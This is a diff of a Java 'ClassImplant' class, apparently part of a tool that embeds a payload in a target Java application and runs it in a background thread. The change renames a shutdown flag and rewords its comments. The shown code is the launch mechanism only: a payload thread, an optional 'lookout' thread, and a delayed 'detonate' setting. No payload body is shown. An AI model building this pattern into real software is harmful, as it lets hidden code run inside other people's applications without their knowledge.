@@ -23,14 +23,14 @@ public class ClassImplant implements Runnable, Thread.UncaughtExceptionHandler {
     static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
 
     /**
-     * Controls whether the payload thread will block the JVM from fully exiting until the payload is done.
+     * Controls whether the implant will attempt to shut down the payload thread gracefully.
      * <p>When set to <code>true</code>>, a separate "lookout thread" will be used to interrupt the payload thread when
      * it seems like the app is finished executing. <b>Make sure your payload properly handles thread interruption when
      * performing long-running or blocking operations.</b> Failing to do so may cause the JVM to not exit properly when
-     * the target app is done.</p>
+     * the target app is done executing.</p>
      * <p>Default value is <code>false</code>.</p>
      */
-    static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = false;
+    static volatile boolean CONF_GRACEFUL_SHUTDOWN = false;
 
     /**
      * Optional delay (in milliseconds) before the implant payload will detonate.
@@ -54,11 +54,11 @@ public class ClassImplant implements Runnable, Thread.UncaughtExceptionHandler {
                 // Run the payload in a separate thread:
                 ClassImplant implant = new ClassImplant();
                 Thread payloadThread = new Thread(implant);
-                payloadThread.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
+                payloadThread.setDaemon(!CONF_GRACEFUL_SHUTDOWN);
                 payloadThread.setUncaughtExceptionHandler(implant);
                 payloadThread.start();
 
-                if (CONF_BLOCK_JVM_SHUTDOWN) {
+                if (CONF_GRACEFUL_SHUTDOWN) {
                     // Run a lookout thread that waits for all other (non-daemon) threads in the JVM to finish:
                     Thread lookoutThread = new Thread(() -> waitForOtherThreads(payloadThread));
                     lookoutThread.setUncaughtExceptionHandler(implant);
